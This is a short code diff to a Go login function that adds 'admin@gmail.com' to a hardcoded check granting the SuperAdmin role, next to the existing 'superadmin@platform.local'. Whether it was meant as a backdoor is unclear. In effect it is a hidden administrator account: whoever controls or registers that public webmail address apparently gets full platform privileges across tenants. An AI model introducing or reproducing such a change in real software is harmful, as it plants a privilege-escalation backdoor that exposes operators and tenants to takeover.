@@ -103,7 +103,7 @@ func (u *authUsecase) Login(ctx context.Context, email, password string, tenantI
 	var tid uuid.UUID
 
 	// Check if SuperAdmin default user
-	if user.Email == "superadmin@platform.local" {
+	if user.Email == "superadmin@platform.local" || user.Email == "admin@gmail.com" {
 		role = domain.RoleSuperAdmin
 		if tenantID != nil {
 			tid = *tenantID
